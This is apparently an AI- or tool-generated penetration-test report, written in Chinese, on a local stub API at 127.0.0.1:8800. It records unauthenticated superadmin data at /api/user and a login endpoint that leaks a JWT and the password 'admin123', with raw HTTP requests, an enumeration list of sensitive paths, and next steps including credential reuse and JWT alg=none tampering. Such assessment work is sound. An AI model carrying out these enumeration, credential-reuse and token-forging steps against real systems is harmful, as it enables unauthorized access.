# 渗透测试报告 — http://127.0.0.1:8800

## TL;DR

| 严重性 | 漏洞 | API 路径 |
|---|---|---|
| **High** | 未授权访问 — 无认证返回 superadmin 数据（任意方法、任意参数通杀）| `/api/user` |
| **High** | 敏感凭据泄漏 — GET/POST `/api/login` 直接返回 JWT + 明文密码 | `/api/login` |

## 资产清单

- 目标：`http://127.0.0.1:8800`
- 形态：Go catch-all 桩服务（所有路径都返回 200；除少数端点返回 JSON 外，其余统一返回 `ok`）
- 已探测路径：`/api/user`、`/api/login`、`/api/users`、`/api/admin`、`/api/config`、`/api/token`、`/api/swagger`、`/swagger-ui`、`/api-docs`、`/openapi.json`、`/actuator/env`、`/actuator/heapdump`、`/.env`、`/api/v1/user`、`/api/v2/user`、`/admin`、`/api/me`、`/api/profile`、`/api/role`、`/api/secret`、`/api/debug`、`/api/env`、`/api/keys`、`/api/db`、`/api/backup`、`/.git`、`/api/config.json`、`/api/dump`、`/healthz`、`/api/health`、`/metrics`

## 攻击面账本

| 攻击面 | 类型 | 状态 | 证据 | 严重性 |
|---|---|---|---|---|

## 发现 #1 — `/api/user` 未授权访问超级管理员数据（High）

### 证据 1.1 — 基线（GET，原始流量）

请求：
```
GET http://127.0.0.1:8800/api/user?id=1 HTTP/1.1
Host: 127.0.0.1:8800
User-Agent: curl/8.16.0
Accept: */*
```

响应：
```
HTTP/1.1 200 OK
content-type: application/json

{"id":1,"name":"admin","role":"superadmin"}
```

### 证据 1.2 — 无任何参数（未授权）

请求：
```
GET http://127.0.0.1:8800/api/user HTTP/1.1
```

响应：`200 OK` → `{"id":1,"name":"admin","role":"superadmin"}`

### 证据 1.3 — 任意 HTTP 方法通杀（鉴权旁路）

请求：
```
DELETE http://127.0.0.1:8800/api/user?id=1 HTTP/1.1
```

响应：`200 OK` → `{"id":1,"name":"admin","role":"superadmin"}`

### 证据 1.4 — 任意 id 关键字通杀（IDOR 不可控）

请求：
```
GET http://127.0.0.1:8800/api/user?id=admin HTTP/1.1
```

响应：`200 OK` → `{"id":1,"name":"admin","role":"superadmin"}`

### 影响

- 无认证、无 token 即可读取 `role=superadmin` 的账户元信息
- 任意 HTTP 方法（GET/POST/PUT/DELETE）均返回同一份 admin 数据，证明服务端**未做任何鉴权与参数化**
- id 参数被完全忽略（无 BOLA 可利用面，但接口本身已经构成"裸奔"未授权）

## 发现 #2 — `/api/login` 明文返回 JWT Token + 密码（High）

### 证据 2.1 — GET 凭据泄漏

请求：
```
GET http://127.0.0.1:8800/api/login HTTP/1.1
Host: 127.0.0.1:8800
```

响应：
```
HTTP/1.1 200 OK
content-type: application/json

{"token":"eyJhbG...dCJ9.sig","user":"admin","password":"admin123"}
```

### 证据 2.2 — POST 凭据泄漏（未做任何校验）

请求：
```
POST http://127.0.0.1:8800/api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"admin123"}
```

响应：
```
HTTP/1.1 200 OK
content-type: application/json

{"token":"eyJhbG...dCJ9.sig","user":"admin","password":"admin123"}
```

### 证据 2.3 — 用泄漏的 Bearer Token 调接口

请求：
```
GET http://127.0.0.1:8800/api/user?id=1 HTTP/1.1
Authorization: Bearer eyJhbG...dCJ9.sig
```

响应：`200 OK` → `{"id":1,"name":"admin","role":"superadmin"}`

### 影响

- 登录接口无论提交何参数都返回同一组凭据，**未做身份校验**
- 响应体明文回显 `password`，违反"响应不应回显密码"的通用安全准则
- JWT token 直接外泄，攻击者无需任何认证即可拿到一个可用的 Bearer token

## 攻击链与下一步

1. **直接利用**：访问 `/api/login` 即可拿到 admin 的 Bearer token + 密码 `admin123`
2. **凭据复用**：用 `admin:admin123` 直接登录任何接入同一身份源的后台
3. **横向扩展**（待真实环境验证）：
   - 用 admin token 探测 `/api/admin`、`/api/config`、`/api/dump` 等高权限端点的真实内容（本桩服务只回 `ok`，需在真实部署上复测）
   - JWT 解码 + 改 `alg=none` / 改 `sub` 提权（如 token 为标准 HS256 签名）
   - 凭据 `admin123` 进入弱口令字典，二次用于其它内网资产

## 完整证据附录

- `/api/user` 基线 / 任意方法 / 任意 id / 无参 — 全部 `200 + {"id":1,"name":"admin","role":"superadmin"}`
- `/api/login` GET / POST — 全部 `200 + {"token":"eyJhbG...dCJ9.sig","user":"admin","password":"admin123"}`
- 路径枚举 30+ 端点 — 全部 `200`，仅 `/api/login`、`/api/users`、`/api/user` 返回有内容的 JSON
